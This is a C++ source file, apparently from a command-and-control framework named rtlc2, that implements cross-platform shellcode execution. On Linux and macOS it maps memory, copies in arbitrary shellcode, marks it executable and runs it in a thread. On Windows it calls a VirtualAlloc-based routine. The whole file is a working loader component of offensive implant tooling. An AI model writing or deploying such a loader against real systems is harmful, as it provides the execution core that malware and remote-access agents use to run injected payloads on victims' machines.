// Cross-platform shellcode execution
// Windows: VirtualAlloc + thread, Linux/macOS: mmap + thread
#include "execution.h"
#include <cstring>

#ifdef RTLC2_WINDOWS
#include <windows.h>
#else
#include <sys/mman.h>
#include <pthread.h>
#include <unistd.h>
#endif

namespace rtlc2 {
namespace execution {

#ifndef RTLC2_WINDOWS

static void* ShellcodeThreadFunc(void* arg) {
    typedef void(*ShellcodeFunc)();
    ((ShellcodeFunc)arg)();
    return NULL;
}

bool ExecuteShellcodeCrossPlatform(const uint8_t* shellcode, size_t size) {
    if (!shellcode || !size) return false;

    // mmap RW memory
    void* mem = mmap(NULL, size, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED) return false;

    memcpy(mem, shellcode, size);

    // Change to RX
    if (mprotect(mem, size, PROT_READ | PROT_EXEC) != 0) {
        munmap(mem, size);
        return false;
    }

    // Execute in new thread
    pthread_t thread;
    if (pthread_create(&thread, NULL, ShellcodeThreadFunc, mem) != 0) {
        munmap(mem, size);
        return false;
    }

    pthread_join(thread, NULL);
    munmap(mem, size);
    return true;
}

#else

bool ExecuteShellcodeCrossPlatform(const uint8_t* shellcode, size_t size) {
    return ExecuteShellcode(shellcode, size, true);
}

#endif

} // namespace execution
} // namespace rtlc2
